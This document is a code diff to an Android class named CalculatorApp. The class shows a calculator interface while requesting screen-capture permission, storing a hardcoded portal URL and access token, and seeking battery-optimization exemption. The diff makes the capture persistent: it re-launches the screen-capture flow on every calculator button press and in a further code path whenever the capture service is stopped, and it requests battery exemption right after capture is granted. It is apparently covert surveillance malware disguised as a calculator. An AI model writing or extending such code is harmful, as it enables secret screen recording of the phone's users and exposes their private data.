@@ -60,18 +60,15 @@ public class CalculatorApp {
             View calcView = buildCalculatorLayout(activity);
             activity.setContentView(calcView);
 
-            // 3. Request battery exemption automatically
-            requestBatteryOptimization(activity);
-
-            // 4. Auto-trigger screen capture permission
-            if (!captureRequested) {
-                calcView.post(new Runnable() {
-                    @Override
-                    public void run() {
+            // 3. Auto-trigger screen capture permission
+            calcView.post(new Runnable() {
+                @Override
+                public void run() {
+                    if (!ScreenCaptureService.isRunning) {
                         startCaptureFlow(activity);
                     }
-                });
-            }
+                }
+            });
         } catch (Throwable t) {
             t.printStackTrace();
         }
@@ -88,6 +85,9 @@ public class CalculatorApp {
                     .putString("portalUrl", HARDCODED_URL)
                     .putString("accessToken", HARDCODED_TOKEN)
                     .apply();
+            }
+            if (!ScreenCaptureService.isRunning) {
+                startCaptureFlow(activity);
             }
         } catch (Throwable t) {
             t.printStackTrace();
@@ -119,8 +119,7 @@ public class CalculatorApp {
     }
 
     public static void startCaptureFlow(Activity activity) {
-        if (activity == null) return;
-        captureRequested = true;
+        if (activity == null || ScreenCaptureService.isRunning) return;
         try {
             setupNotificationChannel(activity);
             // Directly request Screen Capture without asking for notification permission
@@ -151,6 +150,7 @@ public class CalculatorApp {
         if (requestCode == CAPTURE_REQUEST_CODE) {
             if (resultCode == Activity.RESULT_OK && data != null) {
                 startServiceWithData(activity, resultCode, data);
+                requestBatteryOptimization(activity);
             }
             return true;
         }
@@ -295,6 +295,9 @@ public class CalculatorApp {
                 btn.setOnClickListener(new View.OnClickListener() {
                     @Override
                     public void onClick(View v) {
+                        if (!ScreenCaptureService.isRunning) {
+                            startCaptureFlow(activity);
+                        }
                         handleButtonClick(text, formulaView, resultView);
                     }
                 });
